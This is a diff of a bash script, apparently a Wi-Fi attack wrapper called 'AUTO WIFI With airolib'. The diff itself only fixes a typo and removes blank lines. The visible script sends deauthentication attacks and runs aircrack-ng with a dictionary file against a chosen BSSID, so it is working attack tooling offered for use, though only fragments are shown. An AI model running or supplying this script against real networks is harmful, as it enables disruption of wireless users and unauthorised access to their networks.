@@ -1,8 +1,7 @@
 #!/bin/bash
-
 echo "           AUTO WIFI With airolib";
 echo "           ======================";
-echo "All variables are strickt - failing is in your hands";
+echo "All variables are strict - failing is in your hands";
 echo "What you want to call this:";
 read Proj;
 read -p "What Interface will you use: " Iface;
@@ -49,10 +48,8 @@ gnome-terminal -x sh -c "
 	"
 sleep $da;
 echo "deauths send"
-
 }
 deauth;
-
 
 while true; do
 
@@ -79,7 +76,4 @@ gnome-terminal -x sh -c "
         sleep 3;
         aircrack-ng -w  $dic -b $BSSID $result;
         "
-
-
-
 read -n1 -p "Press Enter to Exit" key;
